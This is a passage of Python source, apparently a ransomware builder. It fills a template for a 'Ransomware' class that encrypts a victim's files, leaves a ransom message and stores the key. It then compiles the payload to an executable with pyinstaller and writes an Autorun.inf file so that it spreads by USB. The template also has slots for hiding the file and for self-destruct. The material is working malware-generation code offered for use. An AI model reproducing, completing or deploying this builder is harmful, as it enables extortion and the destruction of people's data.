#    First Name: {random.choice(["James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Charles", "Thomas", "Christopher", "Daniel", "Matthew", "Anthony", "Donald", "Mark", "Paul", "Steven", "Andrew", "Kenneth", "Joshua", "George", "Kevin", "Brian", "Edward", "Ronald", "Timothy", "Jason", "Jeffrey", "Ryan", "Jacob", "Gary", "Nicholas", "Eric", "Stephen", "Jonathan", "Larry", "Justin", "Scott", "Brandon", "Benjamin", "Samuel", "Gregory", "Frank", "Alexander", "Raymond", "Patrick", "Jack", "Dennis", "Jerry", "Tyler", "Aaron", "Jose", "Henry", "Douglas", "Adam", "Peter", "Nathan", "Zachary", "Walter", "Kyle", "Harold", "Carl", "Jeremy", "Keith", "Roger", "Gerald", "Ethan", "Arthur", "Terry", "Christian", "Sean", "Lawrence", "Austin", "Joe", "Noah", "Jesse", "Albert", "Bryan", "Billy", "Bruce", "Willie", "Jordan", "Dylan", "Alan", "Ralph", "Gabriel", "Roy", "Juan", "Wayne", "Eugene", "Logan", "Randy", "Louis", "Russell", "Vincent", "Philip", "Bobby", "Johnny", "Bradley", "Derek", "Martin", "Mason", "Dennis", "Howard", "Herman", "Preston", "Curtis", "Sean", "Nolan", "Floyd", "Leo", "Jared", "Warren", "Lewis", "Caleb", "Nathan", "Kurt", "Adrian", "Cory", "Julian", "Lance", "Cameron", "Victor", "Shane", "Marco", "Spencer", "Max", "Rodney", "Seth", "Dwayne", "Dwight", "Nelson", "Jasper", "Travis", "Garrett", "Jeffery", "Evan", "Devon", "Glen", "Clifford", "Mitchell", "Daryl", "Freddie", "Edwin", "Antonio", "Lucas", "Lloyd", "Dustin", "Sergio", "Tony", "Alex", "Felix", "Tommy", "Percy", "Levi", "Hugo", "Marc", "Dean", "Colin", "Edgar", "Gavin", "Xavier", "Aaron", "Graham", "Shawn", "Miguel", "Geoffrey", "Rodney", "Ricky", "Louis", "Bryce", "Dominic", "Jorge", "Don", "Mathew", "Brady", "Todd", "Karl", "Neil", "Dylan", "Rocky", "Chester", "Wesley", "Wendell", "Sam", "Sylvester", "Trevor", "Greg", "Manuel", "Eddie", "Reginald", "Harvey", "Alfred", "Tyrone", "Orville", "Clyde", "Clayton", "Stanley", "Frederick", "Joey", "Rick", "Randall", "Barry", "Bernard", "Leroy", "Milton", "Isaac", "Wallace", "Ruben", "Ivan", "Todd", "Darnell", "Arturo", "Terrance", "Roderick", "Marco", "Nathaniel", "Simon", "Jimmie", "Monte", "Hector", "Pete", "Tom", "Otis", "Willard", "Troy", "Nathaniel", "Earnest", "Nick", "Guillermo", "Wilson", "Maxwell", "Rodolfo", "Irving", "Conrad", "Cary", "Alvin", "Douglas", "Arnold", "Allen", "Rufus", "Elmer", "Agustin", "Kirk", "Damon", "Devin", "Juan", "Adrian", "Fernando", "Jerald", "Royce", "Terrence", "Enrique", "Lorenzo", "Spencer", "Ernesto", "Javier", "Kendall", "Jacques", "Santiago", "Malcolm", "Floyd", "Everett", "Dante", "Elliott", "Virgil", "Tomas", "Jessie", "Dominick", "Dana", "Winston", "Roland", "Sherman", "Solomon", "Gregg", "Reuben", "Ramiro", "Chance", "Arnold", "Wade", "Edmond", "Ed", "Donovan", "Antoine", "Randal", "Lamar", "Jess", "Sammie", "Leonardo", "Russel"])}
#    Last Name: {random.choice(["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez", "Hernandez", "Lopez", "Gonzalez", "Wilson", "Anderson", "Thomas", "Taylor", "Moore", "Jackson", "Martin", "Lee", "Perez", "Thompson", "White", "Harris", "Sanchez", "Clark", "Ramirez", "Lewis", "Robinson", "Walker", "Young", "Allen", "King", "Wright", "Scott", "Torres", "Nguyen", "Hill", "Flores", "Green", "Adams", "Nelson", "Baker", "Hall", "Rivera", "Campbell", "Mitchell", "Carter", "Roberts", "Gomez", "Phillips", "Evans", "Turner", "Diaz", "Parker", "Cruz", "Edwards", "Collins", "Reyes", "Stewart", "Morris", "Morales", "Murphy", "Cook", "Rogers", "Gutierrez", "Ortiz", "Morgan", "Cooper", "Peterson", "Bailey", "Reed", "Kelly", "Howard", "Ramos", "Kim", "Cox", "Ward", "Richardson", "Watson", "Brooks", "Chavez", "Wood", "James", "Bennett", "Gray", "Mendoza", "Ruiz", "Hughes", "Price", "Alvarez", "Castillo", "Sanders", "Patel", "Myers", "Long", "Ross", "Foster", "Jimenez", "Powell", "Jenkins", "Perry", "Russell", "Sullivan", "Bell", "Coleman", "Butler", "Henderson", "Barnes", "Gonzales", "Fisher", "Vasquez", "Simmons", "Romero", "Jordan", "Patterson", "Alexander", "Hamilton", "Graham", "Reynolds", "Griffin", "Wallace", "Moreno", "West", "Cole", "Hayes", "Bryant", "Herrera", "Gibson", "Ellis", "Tran", "Medina", "Aguilar", "Stevens", "Murray", "Ford", "Castro", "Marshall", "Owens", "Harrison", "Fernandez", "Mcdonald", "Woods", "Washington", "Kennedy", "Wells", "Vargas", "Henry", "Chen", "Freeman", "Webb", "Tucker", "Guzman", "Burns", "Crawford", "Olson", "Simpson", "Porter", "Hunter", "Gordon", "Mendez", "Silva", "Shaw", "Snyder", "Mason", "Dixon", "Munoz", "Hunt", "Hicks", "Holmes", "Palmer", "Wagner", "Black", "Robertson", "Boyd", "Rose", "Stone", "Salazar", "Fox", "Warren", "Mills", "Meyer", "Rice", "Schmidt", "Garza", "Daniels", "Ferguson", "Nichols", "Stephens", "Soto", "Weaver", "Ryan", "Gardner", "Payne", "Grant", "Dunn", "Kelley", "Spencer", "Hawkins", "Arnold", "Pierce", "Vazquez", "Hansen", "Peters", "Santos", "Hart", "Bradley", "Knight", "Elliott", "Cunningham", "Duncan", "Armstrong", "Hudson", "Carroll", "Lane", "Riley", "Andrews", "Alvarado", "Ray", "Delgado", "Berry", "Perkins", "Hoffman", "Johnston", "Matthews", "Pena", "Richards", "Contreras", "Willis", "Carpenter", "Lawrence", "Sandoval", "Guerrero", "George", "Chapman", "Rios", "Estrada", "Ortega", "Watkins", "Greene", "Nunez", "Wheeler", "Valdez", "Harper", "Burke", "Larson", "Santiago", "Maldonado", "Morrison", "Franklin", "Carlson", "Austin", "Dominguez", "Carr", "Lawson", "Jacobs", "Obrien", "Lynch", "Singh", "Vega", "Bishop", "Montgomery", "Oliver", "Jensen", "Harvey", "Williamson", "Gilbert", "Dean", "Sims", "Espinoza", "Howell", "Li", "Wong", "Reid", "Hanson", "Le", "Mccoy", "Garrett", "Burton", "Fuller", "Wang", "Weber", "Welch", "Rojas", "Lucas", "Marquez", "Fields", "Park", "Yang", "Little", "Banks", "Padilla", "Day", "Walsh", "Bowman", "Schultz", "Luna", "Fowler", "Mejia", "Davidson", "Acosta", "Brewer", "May", "Holland", "Juarez", "Newman", "Pearson", "Curtis", "Cortez", "Douglas", "Schneider", "Joseph", "Barrett", "Navarro", "Figueroa", "Keller", "Avila", "Wade", "Molina", "Stanley", "Hopkins", "Campos", "Barnett", "Bates", "Chambers", "Caldwell", "Beck", "Lambert", "Miranda", "Byrd", "Craig", "Ayala", "Lowe", "Frazier", "Powers", "Neal", "Leonard", "Gregory", "Carrillo", "Sutton", "Fleming", "Rhodes", "Shelton", "Schwartz", "Norris", "Jennings", "Watts", "Duran", "Walters", "Cohen", "Mcdaniel", "Moran", "Parks", "Steele", "Vaughn", "Becker", "Holt", "Deleon", "Barker", "Terry", "Hale", "Leon", "Hail", "Benson", "Haynes", "Horton", "Miles", "Lyons", "Pham", "Graves", "Bush", "Thornton", "Wolfe", "Warner", "Caballero", "Mckinney", "Mann", "Zimmerman", "Dawson", "Lara", "Fletcher", "Page", "Mccarthy", "Love", "Robles", "Cervantes", "Solis", "Erickson", "Reeves", "Chang", "Klein", "Salinas", "Fuentes", "Baldwin", "Daniel", "Simon", "Velasquez", "Hardy", "Higgins", "Aguirre", "Lin", "Cummings", "Chandler", "Sharp", "Barber", "Bowen", "Ochoa", "Dennis", "Robbins", "Liu", "Ramsey", "Francis", "Griffith", "Paul", "Blair", "Oconnor", "Cardenas", "Pacheco", "Cross", "Calderon", "Quinn", "Moss", "Swanson", "Chan", "Rivas", "Khan", "Dyer", "Armstrong", "Avery", "Carpenter", "Reilly", "Mcfarland", "Hays", "Church", "Coffey", "Cowan", "Bhat", "Pritchard"])}
#============================#

import fileinput
{self.formatted_imports}
# ==== They ===== Speak ==== #
{self.message_left} # Don't
{self.storage_vars} # They?
# ==== Speak ===== They ==== #

{self.console_code}

class Ransomware:
    def __init__(self, name, file):
        self.name = name
        self.file = file
        self.key = \"Key soon to be <3\"
        self.files = []

    {self.code_profile.key_method}

    {self.decryption_get_key}

    {self.code_profile.storage_method}

    {self.code_profile.encryption_method}

    {self.decryption_function}

    {self.code_profile.encryption_depth}

    {self.code_profile.message_type}

    {self.code_data.all_data[0]}

    {self.code_data.all_data[1]}

    {self.code_profile.hide_file}

    {self.code_profile.self_destruct}

    def run(self):
        filename = os.path.abspath(sys.argv[0])
        print("Main: Main started at", filename)
        with open(filename, "r") as file:
            lines = file.readlines()
            print(f"Main: Ransom Mode {{lines[2][2:9]}}")
        if lines[2][0:9] == "# ENCRYPT":
            self.e_run()
            lines[2] = lines[2].replace("# ENCRYPT", "# DECRYPT")
            with open(filename, "w") as file:
                file.writelines(lines)
        elif lines[2][0:9] == "# DECRYPT":
            self.d_run()
{self.decrypt_reverse_code}

    def e_run(self):
        self.create_key()
        self.get_files()
        self.encrypt_files()
        self.leave_message()
        self.save_key()
{self.added_commands}
    def d_run(self):
        self.get_key()
        self.get_files()
        self.decrypt_files()
{self.added_commands}
if __name__ == \"__main__\":
    ransomware = Ransomware(__name__, sys.argv[0])
    ransomware.run()
        """

    def create_file(self):
        # Getting temp_prof so self.profile remains untampered
        temp_prof = copy.deepcopy(self.profile)

        # Creating folder for file to go to
        if os.path.exists(temp_prof.project_name):
            shutil.rmtree(temp_prof.project_name)
        parent_dir = parent_dir = os.getcwd()
        folder_name = temp_prof.project_name
        os.mkdir(os.path.join(parent_dir, folder_name))

        # Creating Code File
        with open(f"{folder_name}/{temp_prof.file_name}{self.code_profile.file_type}", "w") as file:
            file.write(self.code)

        # Adding USB File if .exe (USB)
        if self.usb:
            with open(f"{folder_name}/Autorun.inf", "w") as file:
                file.write(f"[Autorun]\nopen={temp_prof.file_name}.exe")

        # Turning file to exe if .exe
        if self.exe:
            python_script_path = f"{folder_name}/{temp_prof.file_name}{self.code_profile.file_type}"
            try:
                # Turning to exe, & waiting
                subprocess.run(["pyinstaller", "--onefile", python_script_path], check=True)

                # Removing Stuff around it
                os.remove(f"{temp_prof.file_name}.spec")
                shutil.move(f"dist/{temp_prof.file_name}", f"{folder_name}")
                os.rmdir("dist")
                shutil.rmtree("build")
                os.remove(f"{folder_name}/{temp_prof.file_name}{self.code_profile.file_type}")
            except Exception as e:
                print(f"Failed .exe conversion because {e}")

        if temp_prof.decryption_type == "Pair":
            temp_prof.file_name += "(D)"
            self.code = self.decryption_code
            # Creating Code File
            with open(f"{folder_name}/{temp_prof.file_name}{self.code_profile.file_type}", "w") as file:
                file.write(self.code)

            # Turning file to exe if .exe
            if self.exe:
                python_script_path = f"{folder_name}/{temp_prof.file_name}{self.code_profile.file_type}"
                try:
                    # Turning to exe, & waiting
                    subprocess.run(["pyinstaller", "--onefile", python_script_path], check=True)

                    # Removing Stuff around it
                    os.remove(f"{temp_prof.file_name}.spec")
                    shutil.move(f"dist/{temp_prof.file_name}", f"{folder_name}")
                    os.rmdir("dist")
                    shutil.rmtree("build")
                    os.remove(f"{folder_name}/{temp_prof.file_name}{self.code_profile.file_type}")
                except Exception as e:
                    print(f"Failed .exe conversion because {e}")
            
        